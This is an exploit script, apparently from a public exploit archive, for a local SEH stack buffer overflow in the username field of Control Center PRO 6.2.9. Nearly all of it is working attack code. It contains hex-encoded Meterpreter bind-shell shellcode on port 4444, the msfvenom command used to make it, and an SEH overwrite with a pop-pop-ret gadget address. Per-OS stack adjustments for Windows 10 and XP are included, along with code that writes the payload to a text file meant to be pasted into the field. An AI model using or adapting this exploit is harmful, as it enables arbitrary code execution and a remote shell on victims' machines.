#!/usr/bin/python

# Exploit Title: Local Stack based BufferOverflow (SEH), module input name, (create user) Control Center PRO v 6.2.9
# Date: 09/11/2019
# Exploit Author: Samir sanchez garnica @sasaga92
# Vendor Homepage: http://www.webgateinc.com/wgi/eng/products/list.php?ec_idx1=P610
# Software Link: http://www.webgateinc.com/wgi/eng/products/list.php?ec_idx1=P610&ptype=view&page=&p_idx=90&tab=download&#tabdown
# Version: 6.2.9
# Tested: Windows 10 pro N and Windows XP SP3
# CVE : N/A


'''
Existe una vulnerabilidad de desbordamiento de pila, una vez se intenta hacer uso del modulo crear usuario, en el campo username/nombre, copiando una cantidad
considerable de strings, la cual no es controlada por el software y se produce una sobreescritura del SEH)
'''

import sys
import random
import string
import struct
import argparse

def pattern_create(_type,_length):
  _type = _type.split(" ")

  if _type[0] == "trash":
    return _type[1] * _length
  elif _type[0] == "random":
    return ''.join(random.choice(string.lowercase) for i in range(_length))
  elif _type[0] == "pattern":
    _pattern = ''
    _parts = ['A', 'a', '0']
    while len(_pattern) != _length:
      _pattern += _parts[len(_pattern) % 3]
      if len(_pattern) % 3 == 0:
        _parts[2] = chr(ord(_parts[2]) + 1)
        if _parts[2] > '9':
          _parts[2] = '0'
          _parts[1] = chr(ord(_parts[1]) + 1)
          if _parts[1] > 'z':
            _parts[1] = 'a'
            _parts[0] = chr(ord(_parts[0]) + 1)
            if _parts[0] > 'Z':
              _parts[0] = 'A'
    return _pattern
  else:
    return "Not Found"


def generate_file(_name_file, _payload):
	print _payload
	print "[+] Creando Archivo malicioso"
	_name_file = open(_name_file,"w+")
	_name_file.write(_payload)
	_name_file.close()
	print "[+] Payload de {0} bytes generado, exitosamente.".format(len(_payload))

def main():
    _parser = argparse.ArgumentParser()
    _parser.add_argument("--os", dest="os", help="introduce el os, win10, winxp", required=True)
    _args = _parser.parse_args()
	
	  #badchars 0x0a, 0x0d, >= 0x80

    _name_exploit = "ControlCenterPRO_v6_2_9.txt"

    #sudo ./msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -e x86/alpha_mixed EXITFUNC=seh -f c -b '\x00\x0a\x0d' BufferRegister=ESP
    _shellcode = ("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
        "\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
        "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
        "\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x69\x78\x4e\x62\x37\x70"
        "\x43\x30\x45\x50\x31\x70\x6f\x79\x4d\x35\x46\x51\x6f\x30\x50"
        "\x64\x4e\x6b\x72\x70\x50\x30\x4e\x6b\x46\x32\x64\x4c\x6e\x6b"
        "\x71\x42\x32\x34\x6c\x4b\x61\x62\x34\x68\x66\x6f\x6e\x57\x30"
        "\x4a\x76\x46\x76\x51\x49\x6f\x4e\x4c\x47\x4c\x63\x51\x63\x4c"
        "\x75\x52\x76\x4c\x35\x70\x49\x51\x58\x4f\x54\x4d\x75\x51\x4b"
        "\x77\x6b\x52\x39\x62\x46\x32\x53\x67\x4c\x4b\x50\x52\x76\x70"
        "\x4c\x4b\x71\x5a\x77\x4c\x6e\x6b\x42\x6c\x46\x71\x32\x58\x6a"
        "\x43\x61\x58\x56\x61\x68\x51\x76\x31\x4c\x4b\x73\x69\x55\x70"
        "\x57\x71\x4b\x63\x4e\x6b\x67\x39\x66\x78\x6d\x33\x56\x5a\x32"
        "\x69\x6c\x4b\x35\x64\x4c\x4b\x55\x51\x6a\x76\x50\x31\x59\x6f"
        "\x4c\x6c\x39\x51\x58\x4f\x64\x4d\x35\x51\x5a\x67\x54\x78\x79"
        "\x70\x53\x45\x5a\x56\x67\x73\x71\x6d\x49\x68\x45\x6b\x73\x4d"
        "\x31\x34\x63\x45\x68\x64\x51\x48\x4c\x4b\x70\x58\x44\x64\x37"
        "\x71\x49\x43\x72\x46\x4c\x4b\x36\x6c\x52\x6b\x4e\x6b\x30\x58"
        "\x77\x6c\x36\x61\x4a\x73\x4e\x6b\x77\x74\x4c\x4b\x56\x61\x7a"
        "\x70\x6e\x69\x42\x64\x45\x74\x71\x34\x63\x6b\x61\x4b\x51\x71"
        "\x52\x79\x52\x7a\x72\x71\x39\x6f\x39\x70\x73\x6f\x51\x4f\x73"
        "\x6a\x4e\x6b\x64\x52\x58\x6b\x6c\x4d\x73\x6d\x61\x78\x55\x63"
        "\x77\x42\x55\x50\x67\x70\x42\x48\x73\x47\x54\x33\x36\x52\x63"
        "\x6f\x46\x34\x73\x58\x52\x6c\x63\x47\x44\x66\x56\x67\x69\x6f"
        "\x48\x55\x6d\x68\x5a\x30\x45\x51\x77\x70\x37\x70\x75\x79\x58"
        "\x44\x70\x54\x42\x70\x53\x58\x44\x69\x4f\x70\x30\x6b\x57\x70"
        "\x39\x6f\x5a\x75\x42\x4a\x34\x4b\x42\x79\x52\x70\x4d\x32\x39"
        "\x6d\x62\x4a\x46\x61\x32\x4a\x37\x72\x32\x48\x69\x7a\x66\x6f"
        "\x69\x4f\x39\x70\x4b\x4f\x4b\x65\x4e\x77\x30\x68\x47\x72\x63"
        "\x30\x52\x31\x33\x6c\x4e\x69\x7a\x46\x61\x7a\x56\x70\x61\x46"
        "\x30\x57\x75\x38\x6b\x72\x69\x4b\x44\x77\x73\x57\x79\x6f\x69"
        "\x45\x4d\x55\x6b\x70\x63\x45\x46\x38\x52\x77\x50\x68\x38\x37"
        "\x48\x69\x45\x68\x4b\x4f\x69\x6f\x59\x45\x46\x37\x52\x48\x71"
        "\x64\x68\x6c\x67\x4b\x39\x71\x59\x6f\x6a\x75\x52\x77\x6e\x77"
        "\x45\x38\x63\x45\x32\x4e\x42\x6d\x30\x61\x59\x6f\x4e\x35\x31"
        "\x7a\x35\x50\x30\x6a\x46\x64\x50\x56\x52\x77\x61\x78\x47\x72"
        "\x58\x59\x59\x58\x53\x6f\x39\x6f\x49\x45\x6b\x33\x48\x78\x63"
        "\x30\x73\x4e\x64\x6d\x4c\x4b\x56\x56\x53\x5a\x53\x70\x75\x38"
        "\x77\x70\x52\x30\x63\x30\x45\x50\x33\x66\x50\x6a\x53\x30\x51"
        "\x78\x70\x58\x79\x34\x31\x43\x4a\x45\x79\x6f\x4e\x35\x4e\x73"
        "\x56\x33\x51\x7a\x67\x70\x43\x66\x61\x43\x56\x37\x75\x38\x35"
        "\x52\x79\x49\x48\x48\x71\x4f\x4b\x4f\x7a\x75\x6e\x63\x6b\x48"
        "\x77\x70\x51\x6e\x76\x67\x36\x61\x39\x53\x74\x69\x6b\x76\x44"
        "\x35\x78\x69\x7a\x63\x6f\x4b\x59\x6e\x76\x6e\x30\x32\x6b\x5a"
        "\x61\x7a\x33\x30\x56\x33\x39\x6f\x78\x55\x63\x5a\x65\x50\x79"
        "\x53\x41\x41")
  
    _offset = 664
    _padding = 40000
    _nseh = "\x42\x42\x77\x08"
    _seh = struct.pack("<L", 0x637c1571) #0x0258107E pop edi # pop esi # retn lib_VoiceEngine_dll32.dll 3 8 one-reg, stack edi, esi  nonull, ascii
    
    if _args.os.lower() == "win10":
      _esp_prepend =  "\x54\x58\x66\x05\x34\x18\x50\x5C"   
      _inject = pattern_create("trash A",_offset)
      _inject += _nseh
      _inject += _seh
      _inject += "A" * 4
      _inject += _esp_prepend

      _inject += _shellcode
      _inject += pattern_create("trash D",_padding-len(_inject))

    elif _args.os.lower() == "winxp":
      _esp_prepend = "\x54\x58\x66\x05\x7C\x0C\x50\x5C"
      _inject = pattern_create("trash A",_offset)
      _inject += _nseh
      _inject += _seh
      _inject += "A" * 4
      _inject += _esp_prepend
      _inject += "A" * 16

      _inject += _shellcode
      _inject += pattern_create("trash D",_padding-len(_inject))
    else:
      print("[-] os select is not support, select win10 or winxp")


    generate_file(_name_exploit, _inject)

if __name__ == "__main__":
    main()
